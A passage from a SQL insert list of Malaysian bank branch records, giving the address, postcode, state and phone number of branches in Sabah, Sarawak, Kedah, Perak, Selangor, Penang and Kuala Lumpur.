(453, 11, 3, 'Lot 16 Budusan Square Jalan Bundusan ', ' kota Kinabalu ', '88300', 'Sabah ', ' 6088 - 732 611', NULL, NULL, NULL, NULL),
(454, 11, 3, 'No 11-0 Inanam Point Jalan Tuaran ', 'Kota Kinabalu ', '88450 ', 'Sabah ', ' 6088 - 437 661', NULL, NULL, NULL, NULL),
(455, 11, 3, 'Tingkat Bawah  Central Building Jalan Sagunting', 'Kota Kinabalu', ' 88000 ', ' Sabah ', '6088 - 233 214', NULL, NULL, NULL, NULL),
(456, 11, 3, 'Jalan Kampung Air 4 ', ' Kota Kinabalu ', '88000', 'Sabah', ' 6088 - 249 688', NULL, NULL, NULL, NULL),
(457, 11, 3, 'Industrial Lot 10A & 11A Jalan Bank Bumiputra ', ' Keningau ', '89007', 'Sabah ', ' 6087 - 331 515', NULL, NULL, NULL, NULL),
(458, 11, 3, 'Lot L1-L03 (B) Forex Booth Level 1, Public Concourse Terminal 2 ', ' Kota Kinabalu ', '88740', 'Sabah ', '6088 - 447 968', NULL, NULL, NULL, NULL),
(459, 11, 3, 'MDLD 3269 Block 1 Lot 4 Fajar Centre ', ' Lahad Datu ', '91100', 'Sabah', ' 6089 - 880 609', NULL, NULL, NULL, NULL),
(460, 11, 3, 'Lot 1 Jalan Putatan Putatan Plaza ', 'Kota Kinabalu ', '88200 ', 'Sabah', ' 6088 - 766 101', NULL, NULL, NULL, NULL),
(461, 11, 3, 'Ground Floor  Block C Lot 10 Ranau New Town', 'Ranau', ' 89300 ', ' Sabah', '6088 - 875 271', NULL, NULL, NULL, NULL),
(462, 11, 3, 'TL 639  Bangunan Harisons & Crosfield ', 'Sandakan', '90000 ', ' Sabah', '6089 - 213 272', NULL, NULL, NULL, NULL),
(463, 11, 3, 'Block 30 Kompleks Fajar Jalan Haji Karim ', 'Tawau', '91000 ', ' Sabah', '6089 - 762 200', NULL, NULL, NULL, NULL),
(464, 11, 3, '422 Jalan Hospital ', ' Bandar Sri Aman ', '95000', 'Sarawak', '6083 - 322 007', NULL, NULL, NULL, NULL),
(465, 11, 3, ' Lot 2382 Ground Floor  Block 5 MCLD Boulevard Commercial Centre Jalan Pujut ', ' Miri ', '98000', 'Sarawak ', ' 6085 - 416 559', NULL, NULL, NULL, NULL),
(466, 11, 3, '945 Jalan Parry ', 'Miri ', '98000 ', 'Sarawak', '6085 - 437 729', NULL, NULL, NULL, NULL),
(467, 11, 3, 'Lot 507 Block 9 Miri Concession Land District Jalan Permaisuri ', 'Miri', '98000 ', ' Sarawak', ' 6085 - 420 371', NULL, NULL, NULL, NULL),
(468, 11, 3, 'Lot 1.1 Bangunan Satok Jalan Satok/Jalan Kulas ', 'Kuching ', '93400 ', 'Sarawak', '6082 - 413 155', NULL, NULL, NULL, NULL),
(469, 11, 3, 'Wisma Bukit Mata Kuching Lot 262 Section 48 Jalan Tunku Abdul Rahman ', 'Kuching ', '93100 ', 'Sarawak', '6082 - 236 809', NULL, NULL, NULL, NULL),
(470, 11, 3, '32 Khoo Hun Yeang Street', 'Kuching', ' 93000 ', ' Sarawak ', ' 6082 - 422 522', NULL, NULL, NULL, NULL),
(471, 11, 3, ' Sublot 16  (Lot 2225 Block 71 KCLD) M10 Commercial Centre', 'Kuching Serian Road ', ' 93250 ', 'Sarawak', '  6082 - 616 695', NULL, NULL, NULL, NULL),
(472, 11, 3, '12 Lorong 1 Jalan Abdul Razak', 'Sarikei ', ' 96100 ', 'Sarawak', '6084 - 651 624', NULL, NULL, NULL, NULL),
(473, 11, 3, 'Lot 230 Serian Bazaar ', 'Serian', '94700 ', ' Sarawak', ' 6082 - 874 135', NULL, NULL, NULL, NULL),
(474, 11, 3, 'Lot 2300 BDA-Shahida Commercial Centre Lebuhraya Abang Galau ', 'Bintulu ', '97000 ', 'Sarawak  ', '6086 - 331 475', NULL, NULL, NULL, NULL),
(475, 11, 3, '1 Lorong Kampong Datu 5 Jalan Kampong Datu ', 'Sibu ', '96000 ', 'Sarawak', ' 6084 - 342 404', NULL, NULL, NULL, NULL),
(476, 11, 3, 'Lot 17 Medan Jaya Commercial Centre Tanjung Kidurong ', ' Bintulu ', '97000', 'Sarawak', '6086 - 315 015', NULL, NULL, NULL, NULL),
(477, 11, 3, 'Lot 2691 Block 10 KCLD 3rd Mile Rock Road ', 'Kuching ', '93250 ', 'Sarawak ', ' 6082 - 419 072', NULL, NULL, NULL, NULL),
(478, 11, 3, '44 Jalan Penjara ', ' Kangar', '01000', ' Perlis ', ' 604 - 976 1292', NULL, NULL, NULL, NULL),
(479, 11, 3, '1583 Bangunan Tunku Jalan Tunku Ibrahim ', 'Alor Star', '05000 ', ' Kedah   Tel :  ', '604 - 733 1906', NULL, NULL, NULL, NULL),
(480, 11, 3, 'No 2 Pekan Changloon 2 Lebuhraya Bukit Kayu Hitam ', 'Changloon ', '06010 ', 'Kedah', '604 - 924 3352', NULL, NULL, NULL, NULL),
(481, 11, 3, '3 Taman Mewah ', 'Guar Chempedak', '08800 ', ' Kedah ', '604 - 468 6435', NULL, NULL, NULL, NULL),
(482, 11, 3, 'A10 Jalan Kampung Baru ', ' Sungai Petani ', '08000', 'Kedah', '604 - 423 2233', NULL, NULL, NULL, NULL),
(483, 11, 3, 'Kompleks UMNO Bahagian Kubang Pasu Jalan Ibrahim ', 'Jitra ', '06000 ', 'Kedah', ' 604 - 917 1091', NULL, NULL, NULL, NULL),
(484, 11, 3, '1 Jalan Pandak Mayah 1 Kuah ', 'Pulau Langkawi ', '07000 ', 'Kedah  ', '604 - 966 6725', NULL, NULL, NULL, NULL),
(485, 11, 3, 'Lot 67 & 68  Pekan Kuala Nerang ', ' Kuala Nerang', '06300', ' Kedah', '604 - 786 6641', NULL, NULL, NULL, NULL),
(486, 11, 3, '254A Wisma Koperasi  Jalan Tuanku Putra', 'Kulim ', ' 09000 ', 'Kedah', '604 - 490 4600', NULL, NULL, NULL, NULL),
(487, 11, 3, '106-A Seberang Jalan Putra Mergong ', 'Alor Setar', '05150 ', ' Kedah', '604 - 733 9122', NULL, NULL, NULL, NULL),
(488, 11, 3, 'Bangunan UMNO Jalan Sungai Tiang ', 'Pendang', '06700 ', ' Kedah', '604 - 759 6312', NULL, NULL, NULL, NULL),
(489, 11, 3, '101 - 103 Persiaran Sultan Abdul Hamid', ' Alor Setar', ' 05050', ' Kedah ', '604 - 772 6095', NULL, NULL, NULL, NULL),
(490, 11, 3, '8 Jalan Matang Gedong Taman Sejati Indah ', 'Sungai Petani ', '08000 ', 'Kedah', ' 604 - 431 2905', NULL, NULL, NULL, NULL),
(491, 11, 3, 'Wisma RIA Jalan Badlishah Taman RIA ', 'Sungai Petani ', '08000 ', 'Kedah', '  604 - 422 2486', NULL, NULL, NULL, NULL),
(492, 11, 3, '613 & 615  Jalan Tasik Taman Sri Tasik ', ' Ipoh ', '31400', 'Perak', ' 605 - 546 5623', NULL, NULL, NULL, NULL),
(493, 11, 3, '38-40  Jalan Panggung Wayang', 'Taiping ', ' 34000 ', 'Perak', '605 - 807 2422', NULL, NULL, NULL, NULL),
(494, 11, 3, 'No 2482A Taman Samudera', 'Sri Manjung', ' 32040 ', ' Perak ', '605 - 688 8831', NULL, NULL, NULL, NULL),
(495, 11, 3, 'Lot 2871  off Jalan Kelab ', 'Sitiawan ', '32000 ', 'Perak', '605 - 691 8776', NULL, NULL, NULL, NULL),
(496, 11, 3, '48 Persiaran Greentown 1 Greentown Business Centre ', ' Ipoh ', '30450', 'Perak', '605 - 241 0319', NULL, NULL, NULL, NULL),
(497, 11, 3, '6 Jalan Kelichap ', 'Parit Buntar', '34200 ', ' Perak', ' 605 716 1505', NULL, NULL, NULL, NULL),
(498, 11, 3, '64 Persiaran Silibin Utara Jalan Jelapang ', ' Ipoh', '30020', ' Perak', ' 605 - 527 8605', NULL, NULL, NULL, NULL),
(499, 11, 3, '99 & 101 Jalan Gopeng', 'Kampar ', ' 31900 ', 'Perak', ' 605 - 465 1157', NULL, NULL, NULL, NULL),
(500, 11, 3, '95 Pusat Komersil Jalan Kangsar', 'Kuala Kangsar ', ' 33000 ', 'Perak', '605 - 777 7011', NULL, NULL, NULL, NULL),
(501, 11, 3, '3104-C & D  Jalan Kampar ', ' Langkap ', '36700', 'Perak', '605 - 659 1250', NULL, NULL, NULL, NULL),
(502, 11, 3, '31 & 33  Jalan Lee Ming Hin ', ' Menglembu ', '31450', 'Perak  ', '605 - 281 3657', NULL, NULL, NULL, NULL),
(503, 11, 3, 'Lot 259  Jalan Stesen ', 'Tanjung Rambutan', '31250 ', ' Perak', '605 - 533 2182', NULL, NULL, NULL, NULL),
(504, 11, 3, 'x20 Jalan Pejabat Pos ', 'Batu Gajah', '31000 ', ' Perak ', '  605 - 366 1905', NULL, NULL, NULL, NULL),
(505, 11, 3, 'No 270 Jalan Bercham  ', 'Ipoh ', '31400 ', 'Perak ', '605 - 545 2894', NULL, NULL, NULL, NULL),
(506, 11, 3, 'No. 13 Bidor Centre Point Jalan Dewan Orang Ramai ', 'Bidor ', '35500 ', 'Perak ', ' 605 - 434 3310', NULL, NULL, NULL, NULL),
(507, 11, 3, 'Wisma Pernida Jalan Intan ', 'Grik ', '33300 ', 'Perak', '605 - 791 2824', NULL, NULL, NULL, NULL),
(508, 11, 3, 'Lot 73207 Jalan Canning Estate Ipoh Garden ', ' Ipoh', '31400', ' Perak ', '605 - 547 5678', NULL, NULL, NULL, NULL),
(509, 11, 3, '288 Jalan Gopeng Gunung Rapat ', ' Ipoh ', '31350', 'Perak', '605 - 313 5200', NULL, NULL, NULL, NULL),
(510, 11, 3, 'Ground Floor  Plaza Teh Teng Seng 227 Jalan Raja Permaisuri Bainun ', ' Ipoh ', '30250', 'Perak ', '605 - 255 5450', NULL, NULL, NULL, NULL),
(511, 11, 3, '32 Jalan Pasar', 'Teluk Intan', ' 36000 ', ' Perak ', '605 - 621 2711', NULL, NULL, NULL, NULL),
(512, 11, 3, '112 Jalan Sultan Idris Shah ', 'Ipoh ', '30000 ', 'Perak', '605 - 254 2316', NULL, NULL, NULL, NULL),
(513, 11, 3, '45 Jalan Tun Sambanthan ', ' Ipoh ', '30000', 'Perak', ' 605 - 241 1355', NULL, NULL, NULL, NULL),
(514, 11, 3, 'No 2G Jalan Wawasan 2/4 Bandar Baru Ampang ', ' Ampang ', '68000', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(515, 11, 3, 'Oasis Square No 2 Jalan PJU 1A/7A Ara Damansara ', ' Petaling Jaya ', '47301', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(516, 11, 3, '29 Jalan PCR 1  Kawasan Perniagaan Cheras Raya Batu 11 ', 'Cheras ', '43200 ', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(517, 11, 3, '67 Jalan 8/1  Seksyen 8 ', 'Bandar Baru Bangi', '43650 ', ' Selangor ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(518, 11, 3, '22 Jalan Tiara 2A/KU1 Bandar Baru Klang ', 'Klang ', '41150 ', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(519, 11, 3, 'Lot 395 Jalan 1A/1  Bandar Baru Sungai Buloh ', 'Sungai Buloh ', '47000 ', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(520, 11, 3, '12 Jalan Puteri 1/1 Bandar Puteri ', 'Puchong', '47100 ', ' Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(521, 11, 3, 'Ground Floor Unit 1-1-1 Jalan Setia Prima RU13/R Bandar Setia Alam ', 'Shah Alam ', '40170 ', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(522, 11, 3, '22 Jalan PJS 11/28A  Bandar Sunway ', ' Petaling Jaya ', '46100', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(523, 11, 3, 'Level 1-2 Wisma BU 8 No 11 Lebuh Bandar Utama ', 'Petaling Jaya', '47800 ', ' Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(524, 11, 3, 'Lot 6 Bangunan UMNO  Jalan Besar ', 'Kapar ', '42200 ', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(525, 11, 3, '2 Wisma Anggerik Jalan Perbahan 26/2 HICOM Industrial Park ', 'Shah Alam ', '40400 ', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(526, 11, 3, 'Ground & 1st Floor  Wisma Southern  No 26 - 34 Jalan Dato Hamzah ', ' Klang ', '41000', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(527, 11, 3, '111 & 113 Jalan Gasing ', 'Petaling Jaya', '46000 ', ' Selangor  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(528, 11, 3, '77 Jalan Kapar', ' Klang ', ' 41700', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(529, 11, 3, 'No 12 & 13 Jalan Kenari 1 Bandar Puchong Jaya ', 'Puchong ', '47100 ', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(530, 11, 3, '14 & 16 Jalan MJ/7  Medan Maju Jaya Batu 7 Jalan Klang Lama ', 'Petaling Jaya ', '46000 ', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(531, 11, 3, 'A-1-G Block A Jaya One No 72A Jalan Universiti ', 'Petaling Jaya', '46200 ', ' Selangor  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(532, 11, 3, 'L1-21 (First Floor)  Jaya Shopping Centra Jalan 14/14 ', ' Petaling Jaya ', '46100', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(533, 11, 3, '9 Jalan Tun Aziz Lim Tan ', 'Kajang', '43000 ', ' Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(534, 11, 3, '60 Jalan SS6/14 Kelana Jaya', 'Petaling Jaya ', ' 47301 ', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(535, 11, 3, '17 Jalan TK 1/11A  Plaza Kinrara ', ' Puchong ', '47100', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(536, 11, 3, 'Lot MTBD 14(B)  Departure Level Level 5 Main Terminal Building  KL International Airport  ', ' Sepang', '64000', ' Selangor  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(537, 11, 3, '43-1 (Ground)  No 8 Jalan Anggerik Vanilla BE31/BE Kota Kemuning Seksyen 31 ', 'Shah Alam ', '40460 ', 'Selangor ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(538, 11, 3, '30 Jalan Melati 3/1 Bandar Melawati ', ' Kuala Selangor ', '45000', 'Selangor ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(539, 11, 3, 'No.17, Jalan Jelok 6 Metro Point ', ' Kajang ', '43000', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(540, 11, 3, 'Ground Floor PA-S-16 Pearl Avenue Shop Jalan Pasir Emas ', 'Kajang ', '43000 ', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(541, 11, 3, 'No 108 Persiaran Raja Muda Musa KS4 ', 'Pelabuhan Klang ', '42000 ', 'Selangor ', '1300 880 900', NULL, NULL, NULL, NULL),
(542, 11, 3, 'No 12 & 13 Plaza Azalea Persiaran Bandaraya Seksyen 14', 'Shah Alam ', ' 40000 ', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(543, 11, 3, 'G-108 Centro Jalan Batu Tiga Lama ', ' Klang ', '41300', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(544, 11, 3, '49 Jalan Pinang B 18/B Section 18 ', ' Shah Alam', '40000', ' Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(545, 11, 3, '27 Jalan 52/2 ', 'Petaling Jaya ', '46200 ', 'Selangor   ', '1 300 880 900', NULL, NULL, NULL, NULL),
(546, 11, 3, '14 Jalan Tengku Ampuan Zabedah D9/D Seksyen 9 ', ' Shah Alam ', '40100', 'Selangor  ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(547, 11, 3, '151 Jalan 2/3A off 12 km Jalan Ipoh ', 'Batu Caves ', '68100 ', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(548, 11, 3, 'Ground Floor & Mezzanine No 33 Jalan SP2/1 Taman Serdang Perdana ', 'Seri Kembangan ', '43300 ', 'Selangor  ', '1300 880 900', NULL, NULL, NULL, NULL),
(549, 11, 3, 'Ground Floor  62 Jalan SS 2/60 ', ' Petaling Jaya ', '47300', 'Selangor  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(550, 11, 3, '40 & 42 Jalan SS 15/4D Subang Jaya ', 'Petaling Jaya ', '47500 ', 'Selangor', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(551, 11, 3, '22A Jalan Menteri Sungai Besar ', 'Sabak Bernam ', '45300 ', 'Selangor   ', '1 300 880 900', NULL, NULL, NULL, NULL),
(552, 11, 3, '1-1 Jalan PJU 1/3F Sunwaymas Commercial Centre ', 'Petaling Jaya ', '47301 ', 'Selangor   ', '1 300 880 900', NULL, NULL, NULL, NULL),
(553, 11, 3, ' G1 -G3 Ground Floor Bazaar Klang Utama Taman Klang Utama ', 'Klang ', '42100 ', 'Selangor', '603 - 3290 7526', NULL, NULL, NULL, NULL),
(554, 11, 3, 'No 3 Jalan Nilam 1 Taman Nilam ', 'Dengkil ', '43800 ', 'Selangor', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(555, 11, 3, '29 & 31  Jalan Bunga Tanjong 9C Taman Putra ', 'Ampang ', '68000 ', 'Selangor  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(556, 11, 3, 'No 26 Jalan SJ6 Taman Selayang Jaya', 'Batu Caves ', ' 68100 ', 'Selangor   ', '1300 880 900', NULL, NULL, NULL, NULL),
(557, 11, 3, '2 Jalan SG 1/2 Taman Seri Gombak ', 'Batu Caves', '68100 ', ' Selangor  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(558, 11, 3, ' No 2-2-G & 2-2-1  Wisma Pauson Jalan Taming Kanan Satu Taman Taming Jaya ', 'Balakong', '43200 ', 'Selangor ', ' 1300 880 900', NULL, NULL, NULL, NULL),
(559, 11, 3, '54 Jalan J/U2 Taman Jaya Utama Phase 1 ', 'Teluk Panglima Garang ', '42500 ', 'Selangor  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(560, 11, 3, ' Lot G62 Ground Floor  The Curve No 6 Jalan PJU 7/3 Mutiara Damansara ', ' Petaling Jaya ', '47800', 'Selangor ', '1 300 880 900', NULL, NULL, NULL, NULL),
(561, 11, 3, ' No 43-G Jalan PJU 5/20 Pusat Perdagangan Kota Damansara Kota Damansara PJU 5 ', 'Petaling Jaya ', '47810 ', 'Selangor  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(562, 11, 3, 'Lot 1.04 & 1.05  Level 1 Wisma UNIKEB Universiti Kebangsaan Malaysia ', 'Bangi ', '43600 ', 'Selangor', '1 300 880 900', NULL, NULL, NULL, NULL),
(563, 11, 3, 'Ground Floor Block B Bangunan Pusat Pelajar Universiti Putra Malaysia ', 'Serdang ', '43400 ', 'Selangor  ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(564, 11, 3, '31-1 Jalan USJ 9/5S Subang Business Centre ', 'Subang Jaya ', '47610 ', 'Selangor ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(565, 11, 3, 'Unit G5 & G6 No 1688 Jalan Perusahaan Highway Auto-City Juru Interchange', 'Prai', ' 13600 ', ' Pulau Pinang  ', '604 - 508 9358', NULL, NULL, NULL, NULL),
(566, 11, 3, '2 Jalan Sungai Emas ', 'Batu Feringgi ', '11100 ', 'Pulau Pinang', '604 - 881 3471', NULL, NULL, NULL, NULL),
(567, 11, 3, '3188 Jalan Maju Pusat Perniagaan Maju Utama', 'Bukit Mertajam ', ' 14000 ', 'Pulau Pinang', '604 - 537 6920', NULL, NULL, NULL, NULL),
(568, 11, 3, '21 Jalan Ayer Itam ', 'Pulau Pinang', '11400 ', 'Pulau Pinang', ' 604 - 828 4769', NULL, NULL, NULL, NULL),
(569, 11, 3, '7087 Jalan Kampung Gajah ', 'Butterworth ', '12200 ', 'Pulau Pinang  ', ' 604 - 331 4987', NULL, NULL, NULL, NULL),
(570, 11, 3, 'No 3911 Jalan Che Ahmad  ', 'Nibong Tebal ', '14300 ', 'Pulau Pinang', '604 - 593 3236', NULL, NULL, NULL, NULL),
(571, 11, 3, '409 Jalan Burmah', 'Pulau Pinang', ' 10350 ', 'Pulau Pinang', '604 - 227 1579', NULL, NULL, NULL, NULL),
(572, 11, 3, 'Lot 1F - 118 1st Floor Queensbay Mall 100 Persiaran Bayan Indah ', ' Bayan Baru ', '11900', 'Pulau Pinang ', ' 604 - 642 2164', NULL, NULL, NULL, NULL),
(573, 11, 3, '38 Lebuh Nangka 2 ', 'Bukit Mertajam ', '14000 ', 'Pulau Pinang', ' 604 - 530 5862', NULL, NULL, NULL, NULL),
(574, 11, 3, '43 Lebuh Pantai ', ' Pulau Pinang ', '10300', ' Pulau Pinang ', '604 - 262 8173', NULL, NULL, NULL, NULL),
(575, 11, 3, '60 Lintang Angsana Bandar Baru Ayer Itam ', 'Pulau Pinang ', '11500 ', 'Pulau Pinangx', '604 - 829 1699', NULL, NULL, NULL, NULL),
(576, 11, 3, '1223-1224 Jalan Raya ', 'Bayan Lepas', '11900 ', ' Pulau Pinang  ', '604 - 643 6002', NULL, NULL, NULL, NULL),
(577, 11, 3, '450 Jalan Dato Kramat', 'Pulau Pinang ', ' 10460 ', 'Pulau Pinang', '604 - 229 2066', NULL, NULL, NULL, NULL),
(578, 11, 3, '1284 Jalan Bahru', 'Prai ', ' 13700 ', 'Pulau Pinang  ', '604 - 390 1212', NULL, NULL, NULL, NULL),
(579, 11, 3, 'No 1 Jalan Usahawan 4 Pusat Perniagaan Kepala Batas', 'Kepala Batas ', ' 13200 ', 'Pulau Pinang ', ' 604 - 575 1033', NULL, NULL, NULL, NULL),
(580, 11, 3, 'Lot 33-G-08 Prangin Mall Jalan Dr. Lim Chwee Leong', ' Pulau Pinang ', ' 10100', ' Pulau Pinang', '604 - 262 0021', NULL, NULL, NULL, NULL),
(581, 11, 3, '6162 Jalan Ong Yi How  off Jalan Raja UdaTaman Teras Jaya ', ' Butterworth ', '13400', 'Pulau Pinang', ' 604 - 323 2707', NULL, NULL, NULL, NULL),
(582, 11, 3, '1308 Jalan Besar Sungai Bakap ', ' Sungai Jawi', '14200', ' Pulau Pinang ', ' 604 - 582 4452', NULL, NULL, NULL, NULL),
(583, 11, 3, 'Block 32 Minden Campus Universiti Sains Malaysia  ', 'Minden ', '11800 ', 'Pulau Pinang', '604 - 658 1382', NULL, NULL, NULL, NULL),
(584, 11, 3, '72 Jalan Besar', 'Balik Pulau ', ' 11000 ', 'Pulau Pinang  ', ' 604 - 866 7986', NULL, NULL, NULL, NULL),
(585, 11, 3, '70 Jalan Stesen', 'Bukit Mertajam', ' 14000 ', ' Pulau Pinang', '604 - 539 3567', NULL, NULL, NULL, NULL),
(586, 11, 3, '32 Jalan Mahsuri Bandar Bayan Baru ', 'Pulau Pinang ', '11950 ', 'Pulau Pinang ', '604 - 644 4144', NULL, NULL, NULL, NULL),
(587, 11, 3, 'No 375 Tingkat Bawah Vantage Point Jalan Perak ', 'Jelutong', '11600 ', ' Pulau Pinang', '604 - 283 2178', NULL, NULL, NULL, NULL),
(588, 11, 3, 'Menara BHL,  Jalan Sultan Ahmad Shah', 'Pulau Pinang ', ' 10050 ', 'Pulau Pinang  ', '604 - 227 4397', NULL, NULL, NULL, NULL),
(589, 11, 3, '98-G-29 & 30 Prima Tanjung  Jalan Fettes Tanjung Tokong ', ' Pulau Pinang ', '11200', ' Pulau Pinang ', '604 - 899 0144', NULL, NULL, NULL, NULL),
(590, 11, 3, '1 Jalan Todak 3 Bandar Baru Seberang Jaya ', 'Seberang Jaya ', '13700 ', 'Pulau Pinang  ', '604 - 397 6410', NULL, NULL, NULL, NULL),
(591, 11, 3, '1-G-2B Medan Batu Lancang ', ' Pulau Pinang ', '11600', ' Pulau Pinang ', '604 - 657 1458', NULL, NULL, NULL, NULL),
(592, 11, 3, '91 Jalan Bagan Luar Taman Selat ', 'Butterworth ', '12720 ', 'Pulau Pinang ', '604 - 331 2433', NULL, NULL, NULL, NULL),
(593, 11, 3, '28 Jalan Radin Tengah Bandar Baru Seri Petaling', ' Kuala Lumpur  ', ' 57000', ' Kuala Lumpur', '1 300 880 900', NULL, NULL, NULL, NULL),
(594, 11, 3, '8 Jalan Cempaka SD 12/1  Bandar Sri Damansara ', 'Kuala Lumpur ', '52200 ', 'Kuala Lumpur', '1 300 880 900', NULL, NULL, NULL, NULL),
(595, 11, 3, 'J2 & K1 Taman Tunku Bukit Tunku ', 'Kuala Lumpur  ', '50480 ', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(596, 11, 3, 'Level 15 Bangunan Ming  Jalan Bukit Nenas ', 'Kuala Lumpur  ', '50250 ', 'Kuala Lumpur  ', '603 - 7956 9468', NULL, NULL, NULL, NULL),
(597, 11, 3, 'No 12A-G Jalan Wangsa Maju Delima 11 Wangsa Link  ', 'Pusat Bandar Wangsa Maju ', '53500 ', 'Kuala Lumpur', '603 - 4143 7689/59/7723', NULL, NULL, NULL, NULL),
(598, 11, 3, 'Level 1 Lot A4 Block A Pusat Bandar Damansara ', ' Damansara Heights ', '50490', 'Kuala Lumpur  ', '1 300 880 900', NULL, 'CIBBMYKL', NULL, NULL),
(599, 11, 3, '2 Wisma RKT  off Jalan Raja Abdullah ', ' Kuala Lumpur  ', '50300', ' Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(600, 11, 3, '4 Jalan 54 Desa Jaya  ', ' Kepong ', '52100', 'Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(601, 11, 3, 'Lot KG-20 Ground Floor Endah Parade, No 1 Jalan 1/149E ', ' Bandar Baru Seri Petaling ', '57000', 'Kuala Lumpur', '603 - 9056 1422 / 9056 1423', NULL, NULL, NULL, NULL),
(602, 11, 3, 'Unit G-01, Ground Flr Medical Office Building Gleaneagles Intan Medical Centre  282 Jalan Ampang ', 'Kuala Lumpur ', '50450 ', 'Kuala Lumpur ', '603 - 4252 3059', NULL, NULL, NULL, NULL),
(603, 11, 3, 'Level 1 Menara Olympia Jalan Raja Chulan ', 'Kuala Lumpur ', '50200 ', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(604, 11, 3, 'Plaza Yeoh Tiong Lay  55 Jalan Bukit Bintang ', ' Kuala Lumpur  ', '55100', ' Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(605, 11, 3, 'Block 8 Kompleks Pejabat Kerajaan Jalan Duta ', ' Kuala Lumpur  ', '50480', ' Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(606, 11, 3, '43 Jalan Barat Off Jalan Imbi ', ' Kuala Lumpur  ', '55100', ' Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(607, 11, 3, 'Bangunan Lim 803 Batu 4 1/2 off Jalan Ipoh ', 'Kuala Lumpur ', '51200 ', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(608, 11, 3, 'No 69 Jalan Kuchai Maju 1 Dynasty 2 Off Jalan Kuchai Lama ', 'Kuala Lumpur ', '58200 ', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(609, 11, 3, 'Lot1-01 Menara Hap Seng Jalan P Ramlee ', 'Kuala Lumpur ', '50250 ', 'Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(610, 11, 3, '317-319 Jalan Pudu ', 'Kuala Lumpur  ', '55100 ', 'Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(611, 11, 3, '197 & 199 Jalan Sarjana Taman Connaught ', 'Cheras', ' 56000 ', ' Kuala Lumpur', '1 300 880 900', NULL, NULL, NULL, NULL),
(612, 11, 3, '170 Jalan Sungai Besi ', ' Kuala Lumpur', '57100', ' Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(613, 11, 3, 'Bangunan AMAL 338 Jalan Tuanku Abdul Rahman ', ' Kuala Lumpur ', '50100', ' Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(614, 11, 3, '59 Jalan Sultan ', 'Kuala Lumpur  ', '50000 ', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(615, 11, 3, '6055 Jalan Jambu Gajus Jinjang Selatan ', 'Kuala Lumpur ', '52000 ', 'Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(616, 11, 3, '1st Floor Wisma Jayanita No 64, Jalan Raja Muda Abdul Aziz ', 'Kampung Baru ', '50300 ', 'Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(617, 11, 3, '63 & 65 Jalan Kampung Pandan Kampung Pandan', ' Kuala Lumpur ', ' 55100', ' Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(618, 11, 3, 'No 47-37 Jalan Metro Perdana Timur 1 Taman Usahawan ', 'Kepong ', '52100 ', 'Kuala Lumpur', '1 300 880 900', NULL, NULL, NULL, NULL),
(619, 11, 3, 'Lot 23 Departure Hall Ground Floor KL City Terminal  KL Sentral Station ', 'Kuala Lumpur ', '50470 ', 'Kuala Lumpur  ', '603 - 2273 1950', NULL, NULL, NULL, NULL),
